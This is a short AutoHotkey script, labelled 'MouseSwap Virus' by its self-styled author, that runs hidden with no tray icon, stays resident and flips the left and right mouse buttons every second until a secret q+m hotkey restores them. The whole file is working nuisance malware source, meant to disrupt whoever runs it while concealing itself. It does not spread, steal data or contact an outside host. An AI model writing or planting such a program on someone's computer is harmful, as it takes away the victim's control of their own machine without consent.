/*
  MouseSwap Virus

  Author(s):-     pSych0 C0d3r		 
  Contact:-  pSych0.C0d3r@gmail.com  

  Description:- 
	Swaps Right and Left Mouse Button.
*/

#NoEnv
#SingleInstance Force
#Persistent
#NoTrayIcon

SetBatchLines -1 ;For Speed

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Code Begins

Toggle = 0

SetTimer, SwapIt, 1000

Return	 ;End of Auto Execute Section
;_____________________________________________

SwapIt:
	DllCall( "SwapMouseButton" , Int , Toggle:=!Toggle ) 
Return
  
q & m:: 
  SetTimer, SwapIt, Off 
  DllCall( "SwapMouseButton" , Int , false ) 
ExitApp 